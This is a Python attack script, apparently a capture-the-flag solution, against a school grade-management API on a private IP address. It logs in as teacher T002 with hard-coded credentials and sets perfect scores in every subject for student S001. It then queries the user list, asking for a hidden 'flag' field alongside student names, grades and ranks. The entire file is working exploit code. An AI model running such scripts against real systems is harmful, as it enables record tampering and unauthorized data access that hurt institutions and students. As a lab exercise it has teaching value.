#!/usr/bin/env python3
import requests
import json

BASE_URL = "http://192.168.100.110:54088"
HEADERS = {"x-activate-code": "8d7a77ae-dac9-4397-afd6-44b92fd5b6f7"}


def set_perfect_scores_t002():
    print("\n=== Setting Perfect Scores via T002 (54088) ===")
    session = requests.Session()
    session.headers.update(HEADERS)

    # Login as T002
    login_data = {
        "user_id": "T002",
        "password": "teacher_ec7f5944aa01",
        "user_type": "teacher",
    }
    resp = session.post(f"{BASE_URL}/api/v1/login", json=login_data)
    print(f"Login T002: {resp.status_code}")

    if resp.status_code != 200:
        print(f"[-] Login failed: {resp.text}")
        return

    subjects = ["Math", "English", "Science", "History", "Art"]
    for sub in subjects:
        resp = session.post(
            f"{BASE_URL}/api/v1/score",
            json={"student_id": "S001", "subject": sub, "score": 100},
        )
        print(f"  {sub}: {resp.status_code}")
        if resp.status_code != 200:
            print(f"    Msg: {resp.text}")

    # Check Alice's Grade
    resp = session.get(f"{BASE_URL}/api/v1/student/S001/scores")
    print("\n=== Alice's Scores (After Update) ===")
    print(json.dumps(resp.json(), indent=2))

    # Check if a 'flag' field appears in student scores now?
    # Or in user dump?

    # Check Admin/Teachers Dump again (maybe flag appears there?)
    resp = session.get(
        f"{BASE_URL}/api/v1/users",
        params={"user_type": "students", "fields": "student_id,name,flag,grade,rank"},
    )
    print("\n=== Students Dump (After Update) ===")
    print(json.dumps(resp.json(), indent=2))


set_perfect_scores_t002()
